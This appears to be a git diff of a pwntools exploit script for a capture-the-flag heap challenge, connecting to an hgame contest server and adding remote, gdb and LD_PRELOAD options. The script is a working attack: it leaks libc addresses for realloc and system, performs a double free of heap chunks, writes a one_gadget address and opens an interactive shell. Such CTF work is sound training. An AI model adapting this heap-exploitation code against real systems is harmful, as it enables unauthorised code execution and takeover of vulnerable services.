@@ -3,23 +3,35 @@ import time
 
 #context.log_level = 'debug'
 
-debug = False
+context.log_level = 'debug'
+context.terminal = ["/usr/bin/tmux", "sp", "-h"]
 
-elf = ELF("./vuln")
-libc = ELF("./libc.so.6")
-if debug:
-    io = process("./vuln")
+f_remote = True if "remote" in sys.argv else False
+f_gdb = True if "gdb" in sys.argv else False
+
+vuln_path, libc_path = "./vuln", "./libc.so.6"
+if f_remote:
+   vuln_path = "./vuln.bak"
+   #libc_path = "/root/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so"
+
+success(libc_path)
+elf, rop = ELF(vuln_path), ROP(vuln_path)
+libc, roplibc = ELF(libc_path), ROP(libc_path)
+
+if not f_remote:
+    ld_path = "./ld-2.31.so"
+    # io = process([vuln_path])
+    # io = process([vuln_path], env={"LD_PRELOAD": libc_path})
+    io = process([ld_path, vuln_path], env={"LD_PRELOAD": libc_path})
 else:
-    io = remote("week-1.hgame.lwsec.cn", 30241)
+    io = remote("week-1.hgame.lwsec.cn", 32461)
 
+def ddebug(b=""):
+    if not f_gdb:
+        return
 
-def ddebug():
-    gdb.attach(io)
+    gdb.attach(io, gdbscript=b)
     pause()
-
-
-rop = ROP('./vuln')
-roplibc = ROP('./libc.so.6')
 
 
 def add(idx, size, content):
@@ -40,8 +52,7 @@ def show(idx):
 
 
 for i in range(8):
-    add(i, 0x80, "abc")
-
+    add(i, 0x90, "abc")
 add(8, 0x20, "")
 
 for i in range(8):
@@ -62,16 +73,18 @@ realloc_address = libc.sym['realloc']
 success("realloc_address -> " + hex(realloc_address))
 success("system -> " + hex(libc.symbols["system"]))
 
+ddebug()
 for i in range(7):
     add(i, 0x60, "abc")
-
 add(7, 0x60, "abc")
 add(8, 0x60, "abc")
 add(9, 0x60, "abc")
 
+pause()
 for i in range(7):
     delete(i)
 
+pause()
 delete(7)
 delete(8)
 delete(7)
@@ -91,6 +104,6 @@ add(10, 0x60, p64(one))
 
 io.sendlineafter(">", "1")
 io.sendlineafter("Index: ", '8')
-io.sendlineafter("Size: ", 0x60)
+io.sendlineafter("Size: ", "0x60")
 
 io.interactive()
